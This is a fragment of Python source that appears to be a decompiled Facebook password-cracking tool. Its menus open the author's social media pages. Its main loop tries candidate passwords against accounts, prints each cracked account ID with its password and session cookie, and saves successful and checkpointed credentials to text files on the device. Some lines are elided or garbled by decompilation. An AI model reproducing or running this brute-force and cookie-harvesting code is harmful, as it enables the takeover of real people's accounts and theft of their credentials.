...
def ud():
    os.system('clear')
    jalan(logo)
    print(' \033[1;32m[1] Follow My Fasebook Ide')
    print(' [2] EXIT')
...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] JOIN MY FB Ide')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m CHOOSE OPTION >>> ')
    if opt == '1':
        os.system('xdg-openhttps://www.facebook.com/profile.php?id=100018760997097&mibextid=ZbWKwL/')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    if opt == '2':
        ...
        return None
    if opt == '3':
        os.system('xdg-open https://youtube.com/@md.babluhossin3884')
        return None
    if opt == '4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100090581995627')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[ROSID-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ROSID-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[ROSID-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ROSID-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[ROSID] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
